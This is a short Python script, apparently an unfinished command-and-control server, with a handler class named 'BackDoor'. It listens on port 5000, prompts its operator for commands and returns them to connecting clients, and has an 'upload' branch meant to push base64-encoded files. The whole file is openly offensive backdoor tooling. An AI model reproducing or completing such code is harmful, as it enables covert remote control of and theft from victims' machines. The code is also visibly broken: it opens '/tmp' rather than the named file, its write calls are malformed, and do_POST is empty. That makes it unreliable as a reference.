from http.server import BaseHTTPRequestHandler, HTTPServer
from base64 import b64encode

CAMINHO_WORK = '/tmp'

class BackDoor(BaseHTTPRequestHandler):
    def do_GET(self):
        global comando
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        comando = input("COMANDO:")

        if comando.startswith('upload'):
            print(f'REALIZANDO DOWNLOAD')
            arq = comando.split()[1]

            with open(CAMINHO_WORK, 'rb') as f:
                conteudo_arquivo = f.read()
            self.wfile.write(f"ENVIANDO {arq}", b64encode(conteudo_arquivo))
        else:
            if comando.startswith('download'):
                print(f'REALIZANDO O DOWNLOAD AGUARDE...')
            self.wfile.write(comando)
    
    def do_POST(self):
        ...


srv = HTTPServer(('0.0.0.0', 5000), BackDoor)
srv.serve_forever()